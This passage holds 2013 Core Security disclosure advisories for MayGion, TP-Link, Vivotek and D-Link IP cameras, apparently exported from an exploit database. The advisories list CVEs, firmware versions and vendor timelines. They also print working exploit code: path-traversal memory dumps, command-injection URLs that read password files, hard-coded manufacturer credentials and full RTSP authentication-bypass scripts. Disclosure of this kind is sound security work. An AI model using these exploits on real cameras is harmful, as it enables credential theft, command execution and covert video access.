on firmware v09.27 and below, that could allow an unauthenticated remote
attacker:
1. [CVE-2013-1604] to dump the camera's memory and retrieve user
credentials,
2. [CVE-2013-1605] to execute arbitrary code.
4. *Vulnerable Packages*
. MayGion IP cameras based on firmware 2011.27.09.
. Other firmware versions are probably affected too but they were not
checked.
5. *Non-Vulnerable Packages*
. H.264 ipcam firmware 2013.04.22.
6. *Credits*
These vulnerabilities were discovered and researched by Nahuel Riva and
Francisco Falcon from Core Exploit Writers Team.
7. *Technical Description / Proof of Concept Code*
7.1. *User Credentials Leaked via Path Traversal*
[CVE-2013-1604] The following Python code exploits a path traversal and
dumps the camera's memory. Valid user credentials can be extracted from
this memory dump by an unauthenticated remote attacker.
import httplib
conn = httplib.HTTPConnection(""192.168.100.1"")
conn.request(""GET"", ""/../../../../../../../../../proc/kcore"")
resp = conn.getresponse()
data = resp.read()
conn.close()
7.2. *Buffer overflow*
[CVE-2013-1605] The following Python script can be used to trigger the
vulnerability without authentication. As a result, the Instruction
Pointer register (IP) will be overwritten with 0x61616161, which is a
typical buffer overrun condition.
import httplib
conn = httplib.HTTPConnection(""192.168.100.1"")
conn.request(""GET"", ""/"" + ""A"" * 3000 + "".html"")
resp = conn.getresponse()
data = resp.read()
conn.close()
8. *Report Timeline*
. 2013-05-02:
Core Security Technologies notifies MayGion of the vulnerabilities.
Publication date is set for May 29th, 2013.
. 2013-05-02:
Vendor asks for a report with technical information.
. 2013-05-03:
A draft advisory containing technical details sent to MayGion team.
. 2013-05-03:
Vendor notifies that all vulnerabilities were fixed in the last firmware
version, released April 22nd, 2013.
. 2013-05-09:
Core asks for a list of affected devices and firmware. No reply received.
. 2013-05-28:
Advisory CORE-2013-0322 is published.
9. *References*
[1] http://www.maygion.com
10. *About CoreLabs*
CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies. We conduct our research in several important
areas of computer security including system vulnerabilities, cyber
attack planning and simulation, source code auditing, and cryptography.
Our results include problem formalization, identification of
vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
11. *About Core Security Technologies*
Core Security Technologies enables organizations to get ahead of threats
with security test and measurement solutions that continuously identify
and demonstrate real-world exposures to their most critical assets. Our
customers can gain real visibility into their security standing, real
validation of their security controls, and real metrics to more
effectively secure their organizations.
Core Security's software solutions build on over a decade of trusted
research and leading-edge threat expertise from the company's Security
Consulting Services, CoreLabs and Engineering groups. Core Security
Technologies can be reached at +1 (617) 399-6980 or on the Web at:
12. *Disclaimer*
The contents of this advisory are copyright (c) 2013 Core Security
Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
13. *PGP/GPG Keys*
This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at"
2013-05-29,WebApps,Hardware,Core Security,TP-Link IP Cameras Firmware 1.6.18P12,Multiple Vulnerabilities,"http://corelabs.coresecurity.com
http://www.coresecurity.com/advisories/tp-link-IP-cameras-multiple-vulnerabilities
# MFT: Specify manufacture commands user name and password
http://192.168.1.100/cgi-bin/mft/wireless_mft?ap=travesti;cp%20/var/www/secret.passwd%20/web/html/credenciales
http://192.168.1.100/credenciales
http://corelabs.coresecurity.com.
http://www.coresecurity.com.
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.","Core Security - Corelabs Advisory
TP-Link IP Cameras Multiple Vulnerabilities
1. *Advisory Information*
Title: TP-Link IP Cameras Multiple Vulnerabilities
Advisory ID: CORE-2013-0318
Advisory URL:
Date published: 2013-05-28
Date of last update: 2013-05-28
Vendors contacted: TP-Link
Release mode: Coordinated release
2. *Vulnerability Information*
Class: Use of hard-coded credentials [CWE-798], OS command injection
[CWE-78]
Impact: Code execution, Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-2572, CVE-2013-2573
3. *Vulnerability Description*
Multiple vulnerabilities have been found in TP-Link IP cameras based on
firmware v1.6.18P12 and below, that could allow an unauthenticated
remote attacker:
1. [CVE-2013-2572] to bypass user web interface authentication using
hard-coded credentials.
2. [CVE-2013-2573] to execute arbitrary commands from the
administration web interface. This flaw can also be used to obtain all
credentials of registered users.
4. *Vulnerable Packages*
. TP-Link IP cameras based on firmware v1.6.18P12 and below.
Tests and PoC were run on:
. TL-SC 3130 [CVE-2013-2572] works with this device only
. TL-SC 3130G
. TL-SC 3171G
. TL-SC 4171G
Other TP-Link cameras and firmware versions are probably affected too,
but they were not checked.
5. *Vendor Information, Solutions and Workarounds*
Vendor provides the links to patched firmware versions. This software is
*beta*, TP-Link will release the final versions with release notes and
some new functions and fixes in the following days.
. http://www.tp-link.com/resources/software/TL-SC3430_V1_130527.zip
. http://www.tp-link.com/resources/software/TL-SC3430N_V1_130527.zip
. http://www.tp-link.com/resources/software/TL-SC3130_V1_130527.zip
. http://www.tp-link.com/resources/software/TL-SC3130G_V1_130527.zip
. http://www.tp-link.com/resources/software/TL-SC3171_V1_130527.zip
. http://www.tp-link.com/resources/software/TL-SC3171G_V1_130527.zip
. http://www.tp-link.com/resources/software/TL-SC4171G_V1_130527.zip
6. *Credits*
These vulnerabilities were discovered and researched by Nahuel Riva and
Francisco Falcon from Core Exploit Writers Team. The publication of this
advisory was coordinated by Fernando Miranda from Core Advisories Team.
7. *Technical Description / Proof of Concept Code*
7.1. *Hard-Coded Credentials in Administrative Web Interface*
[CVE-2013-2572] TP-Link IP cameras use the Boa web server [1], a popular
tiny server for embedded Linux devices. 'boa.conf' is the Boa
configuration file, and the following account can be found inside:
MFT manufacture erutcafunam
This account is not visible from the user web interface; users are not
aware of the existence and cannot eliminate it. Through this account it
is possible to access two CGI files located in '/cgi-bin/mft/':
1. 'manufacture.cgi'
2. 'wireless_mft.cgi'
The last file contains the OS command injection showed in the following
section.
7.2. *OS Command Injection in wireless_mft.cgi*
[CVE-2013-2573] The file '/cgi-bin/mft/wireless_mft.cgi', has an OS
command injection in the parameter 'ap' that can be exploited using the
hard-coded credentials showed in the previous section:
username: manufacture
password: erutcafunam
The following proof of concept copies the file where the user
credentials are stored in the web server root directory:
Afterwards, the user credentials can be obtained by requesting:
8. *Report Timeline*
. 2013-04-29:
Core Security Technologies notifies the TP-Link Customer Support of the
vulnerabilities. Publication date is set for May 28th, 2013.
. 2013-04-30:
TP-Link team asks for a report with technical information.
. 2013-05-02:
Technical details sent to TP-Link.
. 2013-05-12:
Vendor notifies that a new firmware will be released around May 20th.
. 2013-05-16:
Core asks vendor if they are ready for coordinated public disclosure on
May 20th.
. 2013-05-17:
Vendor notifies that they have fixed the firmware but the testing
process won't be ready before May 24th.
. 2013-05-20:
Core notifies that the advisory publication was re-scheduled for Monday
27th.
. 2013-05-23:
Vendor sends a copy of the beta firmware in order to confirm if issues
were fixed.
. 2013-05-27:
Vendor notifies that consumers are able to download the Beta firmware
from TP-Link website. The final release will be made public in the
following days, and will increase some new functions.
. 2013-05-28:
Advisory CORE-2013-0318 published.
9. *References*
[1] http://www.boa.org/.
10. *About CoreLabs*
CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies. We conduct our research in several important
areas of computer security including system vulnerabilities, cyber
attack planning and simulation, source code auditing, and cryptography.
Our results include problem formalization, identification of
vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
11. *About Core Security Technologies*
Core Security Technologies enables organizations to get ahead of threats
with security test and measurement solutions that continuously identify
and demonstrate real-world exposures to their most critical assets. Our
customers can gain real visibility into their security standing, real
validation of their security controls, and real metrics to more
effectively secure their organizations.
Core Security's software solutions build on over a decade of trusted
research and leading-edge threat expertise from the company's Security
Consulting Services, CoreLabs and Engineering groups. Core Security
Technologies can be reached at +1 (617) 399-6980 or on the Web at:
12. *Disclaimer*
The contents of this advisory are copyright (c) 2013 Core Security
Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
13. *PGP/GPG Keys*
This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at"
2013-05-01,WebApps,Hardware,Core Security,Vivotek IP Cameras,Multiple Vulnerabilities,"http://corelabs.coresecurity.com
http://www.coresecurity.com/advisories/vivotek-ip-cameras-multiple-vulnerabilities
http://192.168.1.100/cgi-bin/admin/getparam.cgi
http://192.168.1.100/setup/parafile.html
# Create TCP listener socket
# Wait until a new connection arises
# Create forwarder socket
# Pipe them!
# Vivotek PT7135/0400a
# Look for the request CSeq
# Create the response
# Attach the spoofed describe
# Look for the server RTP ports
# For each port in the range create a UDP dispatcher
http://corelabs.coresecurity.com.
http://www.coresecurity.com.
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.","Core Security - Corelabs Advisory
Vivotek IP Cameras Multiple Vulnerabilities
1. *Advisory Information*
Title: Vivotek IP Cameras Multiple Vulnerabilities
Advisory ID: CORE-2013-0301
Advisory URL:
Date published: 2013-04-29
Date of last update: 2013-04-29
Vendors contacted: Vivotek
Release mode: User release
2. *Vulnerability Information*
Class: Information leak through GET request [CWE-598], Buffer overflow
[CWE-119], Authentication issues [CWE-287], Path traversal [CWE-22], OS
command injection [CWE-78]
Impact: Code execution, Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-1594, CVE-2013-1595, CVE-2013-1596, CVE-2013-1597,
CVE-2013-1598
3. *Vulnerability Description*
Multiple vulnerabilities have been found in Vivotek IP cameras [1] (and
potentially cameras from other vendors sharing the affected firmware)
that could allow an unauthenticated remote attacker:
1. [CVE-2013-1594] to process GET requests that contain sensitive
information,
2. [CVE-2013-1595] to execute arbitrary code,
3. [CVE-2013-1596] to access the video stream via RTSP,
4. [CVE-2013-1597] to dump the camera's memory and retrieve user
credentials,
5. [CVE-2013-1598] to execute arbitrary commands from the
administration web interface (pre-authentication with firmware 0300a and
post-authentication with firmware 0400a).
4. *Vulnerable Packages*
. Vivotek PT7135 IP camera with firmware 0300a.
. Vivotek PT7135 IP camera with firmware 0400a.
. Other Vivotek cameras/firmware are probably affected too, but they
were not checked.
5. *Non-Vulnerable Packages*
Vendor did not provide details. Contact Vivotek for further information.
6. *Vendor Information, Solutions and Workarounds*
There was no official answer from Vivotek after several attempts to
report these vulnerabilities (see [Sec. 9]). Contact vendor for further
information.
Some mitigation actions may be:
. Do not expose the camera to internet unless absolutely necessary.
. Filter RTSP traffic (default port 554) if possible.
. Have at least one proxy filtering '/../../' and 'getparam.cgi' in
HTTP requests.
. Filter strings in the parameter 'system.ntp' on every request made
to the binary 'farseer.out'.
7. *Credits*
[CVE-2013-1594] was originally discovered and reported [2] by Alejandro
Leon Morales [3] and re-discovered on new firmware versions by Flavio De
Cristofaro from Core Security.
[CVE-2013-1595] and [CVE-2013-1596] were discovered and researched by
Martin Rocha from Core Impact Pro Team. The PoC of [CVE-2013-1596] was
made by Martin Rocha with help of Juan Cotta from Core QA Team.
[CVE-2013-1597] and [CVE-2013-1598] were discovered and researched by
Francisco Falcon and Nahuel Riva from Core Exploit Writers Team.
The publication of this advisory was coordinated by Fernando Miranda
from Core Advisories Team.
8. *Technical Description / Proof of Concept Code*
8.1. *Information leak through GET request*
[CVE-2013-1594] Several Vivotek cameras store Wireless keys and 3rd
party credentials in clear text allowing a remote attacker to obtain
sensitive information which might be valuable to perform further
attacks. Sensitive information stored in plain text includes:
. FTP credentials
. Share folder credentials
. SMTP credentials
. WEP / WPA Keys
. DynDNS credentials
. Safe100.net credentials
. TZO credentials, among others.
The following GET requests can exploit the vulnerability (requests may
change according to firmware versions and vendors devices):
8.2. *Remote Buffer Overflow*
[CVE-2013-1595] The following Python script can be used to trigger the
vulnerability. This script will send to the RTSP service a specially
crafted packet with the header field 'Authorization' fully completed
with the character 'a' (0x61). As a result, the Instruction Pointer
register (IP) will be overwritten with 0x61616161, which is a typical
buffer overrun condition.
import socket, base64
cam_ip = '192.168.1.100'
session_descriptor = 'live.sdp'
request = 'DESCRIBE rtsp://%s/%s RTSP/1.0\r\n' % (cam_ip,
session_descriptor)
request+= 'CSeq: 1\r\n'
request+= 'Authorization: Basic %s\r\n'
request+= '\r\n'
auth_little = 'a' * 1000
auth_big = 'a' * 10000
msgs = [request % auth_little, request % auth_big]
for msg in msgs:
s = socket.socket()
s.connect((cam_ip, 554))
print s.send(msg)
print s.recv(0x10000)
s.close()
8.3. *RTSP Authentication Bypass*
[CVE-2013-1596] This vulnerability is triggered by sending specially
crafted RTSP packets to remote TCP port 554 of a Vivotek PT7135 camera.
As a result, the video stream can be accessed by an unauthenticated
remote attacker.
import sys
from socket import *
from threading import Thread
import time, re
LOGGING = 1
def log(s):
if LOGGING:
print '(%s) %s' % (time.ctime(), s)
class UDPRequestHandler(Thread):
def __init__(self, data_to_send, recv_addr, dst_addr):
Thread.__init__(self)
self.data_to_send = data_to_send
self.recv_addr = recv_addr
self.dst_addr = dst_addr
def run(self):
sender = socket(AF_INET, SOCK_DGRAM)
sender.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
sender.sendto(self.data_to_send, self.dst_addr)
response = sender.recv(1024)
sender.sendto(response, self.recv_addr)
sender.close()
class UDPDispatcher(Thread):
dispatchers = []
def __has_dispatcher_for(self, port):
return any([d.src_port == port for d in UDPDispatcher.dispatchers])
def __init__(self, src_port, dst_addr):
Thread.__init__(self)
if self.__has_dispatcher_for(src_port):
raise Exception('There is already a dispatcher for port %d'
% src_port)
self.src_port = src_port
self.dst_addr = dst_addr
UDPDispatcher.dispatchers.append(self)
def run(self):
listener = socket(AF_INET, SOCK_DGRAM)
listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
listener.bind(('', self.src_port))
while 1:
try:
data, recv_addr = listener.recvfrom(1024)
if not data: break
UDPRequestHandler(data, recv_addr, self.dst_addr).start()
except Exception as e:
print e
break
listener.close()
UDPDispatcher.dispatchers.remove( self )
class PipeThread(Thread):
pipes = []
def __init__(self, source, sink, process_data_callback=lambda x: x):
Thread.__init__(self)
self.source = source
self.sink = sink
self.process_data_callback = process_data_callback
PipeThread.pipes.append(self)
def run(self):
while 1:
try:
data = self.source.recv(1024)
data = self.process_data_callback(data)
if not data: break
self.sink.send( data )
except Exception as e:
log(e)
break
PipeThread.pipes.remove(self)
class TCPTunnel(Thread):
def __init__(self, src_port, dst_addr, process_data_callback=lambda
x: x):
Thread.__init__(self)
log('[*] Redirecting: localhost:%s -> %s:%s' % (src_port,
dst_addr[0], dst_addr[1]))
self.dst_addr = dst_addr
self.process_data_callback = process_data_callback
self.sock = socket(AF_INET, SOCK_STREAM)
self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
self.sock.bind(('', src_port))
self.sock.listen(5)
def run(self):
while 1:
newsock, address = self.sock.accept()
fwd = socket(AF_INET, SOCK_STREAM)
fwd.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
fwd.connect(self.dst_addr)
PipeThread(newsock, fwd, self.process_data_callback).start()
PipeThread(fwd, newsock, self.process_data_callback).start()
class Camera():
def __init__(self, address):
self.address = address
def get_describe_data(self):
return ''
class Vivotek(Camera):
def __init__(self, address):
Camera.__init__(self, address)
def get_describe_data(self):
return 'v=0\r\no=RTSP 836244 0 IN IP4 0.0.0.0\r\ns=RTSP
server\r\nc=IN IP4 0.0.0.0\r\nt=0
0\r\na=charset:Shift_JIS\r\na=range:npt=0-\r\na=control:*\r\na=etag:1234567890\r\nm=video
0 RTP/AVP 96\r\nb=AS:1200\r\na=rtpmap:96
MP4V-ES/30000\r\na=control:trackID=1\r\na=fmtp:96
profile-level-id=3;config=000001B003000001B509000001000000012000C48881F4514043C1463F;decode_buf=76800\r\nm=audio
0 RTP/AVP 97\r\na=control:trackID=3\r\na=rtpmap:97
mpeg4-generic/16000/2\r\na=fmtp:97 streamtype=5; profile-level-id=15;
mode=AAC-hbr; config=1410;SizeLength=13; IndexLength=3;
IndexDeltaLength=3; CTSDeltaLength=0; DTSDeltaLength=0;\r\n'
class RTSPAuthByPasser():
DESCRIBE_REQ_HEADER = 'DESCRIBE rtsp://'
UNAUTHORIZED_RESPONSE = 'RTSP/1.0 401 Unauthorized'
SERVER_PORT_ARGUMENTS = 'server_port='
DEFAULT_CSEQ = 1
DEFAULT_SERVER_PORT_RANGE = '5556-5559'
def __init__(self, local_port, camera):
self.last_describe_req = ''
self.camera = camera
self.local_port = local_port
def start(self):
log('[!] Starting bypasser')
TCPTunnel(self.local_port, self.camera.address,
self.spoof_rtsp_conn).start()
def spoof_rtsp_conn(self, data):
if RTSPAuthByPasser.DESCRIBE_REQ_HEADER in data:
self.last_describe_req = data
elif RTSPAuthByPasser.UNAUTHORIZED_RESPONSE in data and
self.last_describe_req:
log('[!] Unauthorized response received. Spoofing...')
spoofed_describe = self.camera.get_describe_data()
m = re.search('.*CSeq:\\s*(\\d+?)\r\n.*',
self.last_describe_req)
cseq = m.group(1) if m else RTSPAuthByPasser.DEFAULT_CSEQ
data = 'RTSP/1.0 200 OK\r\n'
data+= 'CSeq: %s\r\n' % cseq
data+= 'Content-Type: application/sdp\r\n'
data+= 'Content-Length: %d\r\n' % len(spoofed_describe)
data+= '\r\n'
data+= spoofed_describe
elif RTSPAuthByPasser.SERVER_PORT_ARGUMENTS in data:
m = re.search('.*%s\\s*(.+?)[;|\r].*' %
RTSPAuthByPasser.SERVER_PORT_ARGUMENTS, data)
ports = m.group(1) if m else
RTSPAuthByPasser.DEFAULT_SERVER_PORT_RANGE
begin_port, end_port = map(int, ports.split('-'))
for udp_port in xrange(begin_port, end_port + 1):
try:
UDPDispatcher(udp_port, (self.camera.address[0],
udp_port)).start()
except:
pass
return data
if __name__ == '__main__':
if len( sys.argv ) > 1:
listener_port = camera_port = int(sys.argv[1])
camera_ip = sys.argv[2]
if len(sys.argv) == 4:
camera_port = int(sys.argv[3])
RTSPAuthByPasser(listener_port, Vivotek((camera_ip,
camera_port))).start()
else:
print 'usage: python %s [local_port] [camera_ip]
[camera_rtsp_port]'
8.4. *User Credentials Leaked via Path Traversal*
[CVE-2013-1597] The following Python code exploits a path traversal and
dumps the camera's memory. Valid user credentials can be extracted from
this memory dump by an unauthenticated remote attacker (firmware 0300a).
The same attack is still valid with firmware 0400a but the user has to
be authenticated in order to exploit this flaw.
import httplib
conn = httplib.HTTPConnection(""192.168.1.100"")
conn.request(""GET"", ""/../../../../../../../../../proc/kcore"")
resp = conn.getresponse()
data = resp.read()
8.5. *OS Command Injection*
[CVE-2013-1598] The command injection is located in the binary file
'farseer.out' in the parameter 'system.ntp':
.text:0000CB34                 MOV     R1, R4
.text:0000CB38                 LDR     R0, =aCmdporcessStar ;
""[CmdPorcess] Start sync with NTP server %s""...
.text:0000CB3C                 ADD     R10, SP, #0x144+var_120
.text:0000CB40                 BNE     loc_CB68
.text:0000CB68                 BL      .printf
.text:0000CB6C                 LDR     R2, =aSS_0      ; ""%s%s""
.text:0000CB70                 LDR     R3, =aUsrSbinPsntpda ;
""/usr/sbin/psntpdate -4fr ""
.text:0000CB74                 MOV     R1, #0xFF       ; maxlen
.text:0000CB78                 MOV     R0, R10         ; s
.text:0000CB7C                 STR     R4, [SP,#0x144+var_144]
.text:0000CB80                 BL      .snprintf
.text:0000CB84                 MOV     R0, R10         ; command
.text:0000CB88                 BL      .system
9. *Report Timeline*
. 2013-03-06:
Core Security Technologies notifies the Vivotek Customer Support of the
vulnerability (tracking ID CRM:00930113) and requests a security manager
to send a draft report regarding these vulnerabilities. No reply received.
. 2013-03-11:
Core asks for a security manager to send a confidential report.
. 2013-03-14:
Core notifies the Vivotek Technical Support of the vulnerability
(tracking ID CRM:00930485).
. 2013-03-18:
Core opens a new ticket in the Vivotek Technical Support (tracking ID
CRM:00930670).
. 2013-03-21:
Core asks for a reply regarding the tracking ID CRM:00930485.
. 2013-04-24:
Core tries to contact vendor for last time without any reply.
. 2013-04-29:
After 6 failed attempts to report the issues, the advisory
CORE-2013-0301 is published as 'user-release'.
10. *References*
[1] http://www.vivotek.com/web/product/NetworkCameras.aspx
[2] https://www.securityfocus.com/bid/54476.
[3] Alejandro Leon Morales [Gothicx] http://www.undermx.blogspot.mx.
11. *About CoreLabs*
CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies. We conduct our research in several important
areas of computer security including system vulnerabilities, cyber
attack planning and simulation, source code auditing, and cryptography.
Our results include problem formalization, identification of
vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
12. *About Core Security Technologies*
Core Security Technologies enables organizations to get ahead of threats
with security test and measurement solutions that continuously identify
and demonstrate real-world exposures to their most critical assets. Our
customers can gain real visibility into their security standing, real
validation of their security controls, and real metrics to more
effectively secure their organizations.
Core Security's software solutions build on over a decade of trusted
research and leading-edge threat expertise from the company's Security
Consulting Services, CoreLabs and Engineering groups. Core Security
Technologies can be reached at +1 (617) 399-6980 or on the Web at:
13. *Disclaimer*
The contents of this advisory are copyright (c) 2012 Core Security
Technologies and (c) 2012 CoreLabs, and are licensed under a Creative
Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
14. *PGP/GPG Keys*
This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at"
2013-05-01,WebApps,Hardware,Core Security,D-Link IP Cameras,Multiple Vulnerabilities,"http://corelabs.coresecurity.com/
http://www.coresecurity.com/advisories/d-link-ip-cameras-multiple-vulnerabilities
http://192.168.1.100/cgi-bin/rtpd.cgi?uname&-a;cat&/etc/passwd
http://192.168.1.100/upnp/asf-mp4.asf
http://192.168.1.100/md/lums.cgi
# Create TCP listener socket
# Wait until a new connection arises
# Create forwarder socket
# Pipe them!
# D-Link DCS-2102/1.06-5731
# Look for the request CSeq
# Create the response
# Attach the spoofed describe
# Look for the server RTP ports
# For each port in the range create a UDP dispatcher
http://corelabs.coresecurity.com/themes/sample_theme/images/coffee-pot.png.
http://corelabs.coresecurity.com.
http://www.coresecurity.com.
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.","Core Security - Corelabs Advisory
D-Link IP Cameras Multiple Vulnerabilities
1. *Advisory Information*
Title: D-Link IP Cameras Multiple Vulnerabilities
Advisory ID: CORE-2013-0303
Advisory URL:
Date published: 2013-04-29
Date of last update: 2013-03-29
Vendors contacted: D-Link Corporation
Release mode: Coordinated release
2. *Vulnerability Information*
Class: OS command injection [CWE-78], Authentication issues [CWE-287],
Information leak through GET request [CWE-598], Authentication issues
[CWE-287], Use of hard-coded credentials [CWE-798]
Impact: Code execution, Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-1599, CVE-2013-1600, CVE-2013-1601, CVE-2013-1602,
CVE-2013-1603
3. *Vulnerability Description*
Multiple vulnerabilities have been found in D-Link IP cameras [1] that
could allow an unauthenticated remote attacker:
1. [CVE-2013-1599] to execute arbitrary commands from the
administration web interface,
2. [CVE-2013-1600] to access the video stream via HTTP,
3. [CVE-2013-1601] to access the ASCII video stream via image luminance,
4. [CVE-2013-1602] to access the video stream via RTSP,
5. [CVE-2013-1603] to bypass RTSP authentication using hard-coded
credentials.
4. *Vulnerable Packages*
The following is the list of affected devices and the associated
firmware (confirmed by D-Link). Other SKUs are probably affected too,
but they were not checked.
[CVE-2013-1599]
. DCS-3411/3430 - firmware v1.02
. DCS-5605/5635 - v1.01
. DCS-1100L/1130L - v1.04
. DCS-1100/1130 - v1.03
. DCS-1100/1130 - v1.04_US
. DCS-2102/2121 - v1.05_RU
. DCS-3410 - v1.02
. DCS-5230 - v1.02
. DCS-5230L - v1.02
. DCS-6410 - v1.00
. DCS-7410 - v1.00
. DCS-7510 - v1.00
. WCS-1100 - v1.02
[CVE-2013-1600]
. DCS-2102/2121 - v1.05_RU
. DCS-2102/2121 - v1.06
. DCS-2102/2121 - v1.06_FR
. TESCO DCS-2102/2121 - v1.05_TESCO
[CVE-2013-1601] and [CVE-2013-1603]
. DCS-3411/3430 - v1.02
. DCS-5605/5635 - v1.01
. DCS-1100L/1130L - v1.04
. DCS-1100/1130 - v1.03
. DCS-1100/1130 - v1.04_US
. DCS-2102/2121 - v1.05_RU
. DCS-2102/2121 - v1.06
. DCS-2102/2121 - v1.06_FR
. TESCO DCS-2102/2121 - v1.05_TESCO
. DCS-3410 - v1.02
. DCS-5230 - v1.02
. DCS-5230L - v1.02
. DCS-6410 - v1.00
. DCS-7410 - v1.00
. DCS-7510 - v1.00
. WCS-1100 - v1.02
[CVE-2013-1602]
. ALL mentioned devices and firmware.
5. *Vendor Information, Solutions and Workarounds*
D-Link announces that all patches are ready and scheduled for posting on
corporate web site for all customers [2013-04-25]. Contact D-Link for
further information.
6. *Credits*
[CVE-2013-1599], [CVE-2013-1600] and [CVE-2013-1601] were discovered and
researched by Francisco Falcon and Nahuel Riva from Core Exploit Writers
Team.
[CVE-2013-1602] was discovered and researched by Martin Rocha from Core
Impact Pro Team. The PoC was made by Martin Rocha with help of Juan
Cotta from Core QA Team.
[CVE-2013-1603] was discovered and researched by Pablo Santamaria from
Core Security Consulting Services.
The publication of this advisory was coordinated by Fernando Miranda
from Core Advisories Team.
7. *Technical Description / Proof of Concept Code*
7.1. *OS Command Injection*
[CVE-2013-1599] A security issue located in '/var/www/cgi-bin/rtpd.cgi'
allows an unauthenticated remote attacker to execute arbitrary commands
through the camera's web interface. The OS command injection is due to
this code in 'rtpd.cgi':
echo ""$QUERY_STRING"" | grep -vq ' ' || die ""query string cannot contain
spaces.""
. $conf > /dev/null 2> /dev/null
eval ""$(echo $QUERY_STRING | sed -e 's/&/ /g')""
The first line of this snippet basically ensures that there are no
spaces in '$QUERY_STRING'. The last line uses 'sed' to replace
ampersands '&' with spaces, and then call to the function 'eval()',
resulting in a typical command injection. For example, in order to execute:
uname -a;cat /etc/passwd
the following request can be sent to the camera web interface:
7.2. *Authentication Bypass*
[CVE-2013-1600] The live video stream can be accessed without
authentication by a remote attacker via the following request:
7.3. *ASCII Video Stream Information Leak*
[CVE-2013-1601] An ASCII output (the image luminance) of the live video
stream can be accessed by a remote unauthenticated attacker via:
The following example is the output of a coffee pot video stream [2]:
O O O O O O O O O O O O O O O O O O O O O O O O O O o o o o o o o o o o o o
O O O O O O O O O O O O O O O O O O O O o o o O O O o o o o o o o o o o o o
O O O O O O O O O O O O O O O O O O .       . . o O O o o o o o o o o o o o
O O O O O O O O O O O O o o O O o         . .   o o o o o o o o o o o o o o
O O O O O O O O O O O O o o o o . . . . .                   . o o o o o o o
O O O O O O O O O O o . o O O o                               . o o o o o o
O O O O O O O O O .                                           . o o o o o o
O O O O O O O O .                                         . o o o o o o o o
O O O O O O O .     . o O O o .                         . o o o o o o o o o
O O O O O O o     . O O O O O O                         . o o o o o o o o o
O O O O O O .     O O O O O O O .     . . . .             o o o o o o o o o
O O O O O O     o O O O O O O O .     . . o . .           . o o o o o o o o
O O O O O O     o O O O O O O O .   . . o o o . . . . . . . o o o o o o o o
O O O O O O     o O O O O O O o . o O O o O O . . . . . . . . o o o o o o o
O O O O O O .   o O O O O O O o . O O O o O O . . . . . . . . . o o o o o o
O O O O O O .   . O O O O O o . . O O o o O O o . . . . . . . . o o o o o o
O O O O O O o     O O O O O o . o O O o o O O o . . . . . . . . . o o o o o
O O O O O O O     O O O O O . . o O O o o O O o . . . . . . . . . o o o o o
O O O O O O O .   o O O O o . o o o O o o O O o . . . . . . . . . . o o o o
O O O O O O O o   . O O O o . o o o O o o O O o . . . . . . . . . . o o o o
O O O O O O O O   . O O O . . o o o O o o O O o . . . . . . . . . . o o o o
O O O O O O O O     O O O . . o o o O o o O O o . . . . . . . . . . . o o o
O O O O O O O O o   o O o   o o o o O o o o O o . . . . . . . . . . . o o o
O O O O O O O O O   . O o   o o o o O o . o O o . . . . . . . . . . . . o o
O O O O O O O O O .   O o . o o o o O . . o O o . . . . . . . . . . . . . o
O O O O O O O O O o   o . . o o o o o . . o O o . . . . . . . .   .   . . o
O O O O O O O O O O   . . . o o o . o . . o O o . . . .               .   .
o O O O O O O O O O .     . o o o . o . . . O o . .                   .
o o O O O O O O O O o     . o o o . o . . . O o . .
o o o O O O O O O O o     . o o o . o . . . O o .
7.4. *RTSP Authentication Bypass*
[CVE-2013-1602] This vulnerability is triggered because:
1. Authentication is only present in DESCRIBE requests but not in
every subsequent request.
2. When the RTSP session is being established, the authentication
request of current session is ignored (a previously stored response is
used instead).
As a result, the video stream can be accessed by an unauthenticated
remote attacker.
import sys
from socket import *
from threading import Thread
import time, re
LOGGING = 1
def log(s):
if LOGGING:
print '(%s) %s' % (time.ctime(), s)
class UDPRequestHandler(Thread):
def __init__(self, data_to_send, recv_addr, dst_addr):
Thread.__init__(self)
self.data_to_send = data_to_send
self.recv_addr = recv_addr
self.dst_addr = dst_addr
def run(self):
sender = socket(AF_INET, SOCK_DGRAM)
sender.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
sender.sendto(self.data_to_send, self.dst_addr)
response = sender.recv(1024)
sender.sendto(response, self.recv_addr)
sender.close()
class UDPDispatcher(Thread):
dispatchers = []
def __has_dispatcher_for(self, port):
return any([d.src_port == port for d in UDPDispatcher.dispatchers])
def __init__(self, src_port, dst_addr):
Thread.__init__(self)
if self.__has_dispatcher_for(src_port):
raise Exception('There is already a dispatcher for port %d'
% src_port)
self.src_port = src_port
self.dst_addr = dst_addr
UDPDispatcher.dispatchers.append(self)
def run(self):
listener = socket(AF_INET, SOCK_DGRAM)
listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
